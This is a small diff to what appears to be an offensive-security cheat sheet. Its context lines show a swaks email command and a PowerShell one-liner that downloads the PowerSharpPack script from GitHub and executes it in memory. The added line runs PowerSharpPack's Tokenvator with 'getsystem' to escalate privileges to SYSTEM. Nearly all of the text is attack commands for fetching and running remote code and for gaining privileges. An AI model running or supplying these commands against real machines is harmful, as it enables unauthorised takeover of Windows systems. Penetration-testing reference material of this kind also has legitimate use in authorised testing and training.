@@ -972,4 +972,5 @@ swaks --to w@domain.com --server 192.168.1.1 --body "Hello" --header "Subject: I
 PowerSharpPack
 ```
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
+PowerSharpPack -Tokenvator -Command "getsystem powershell.exe"
 ```
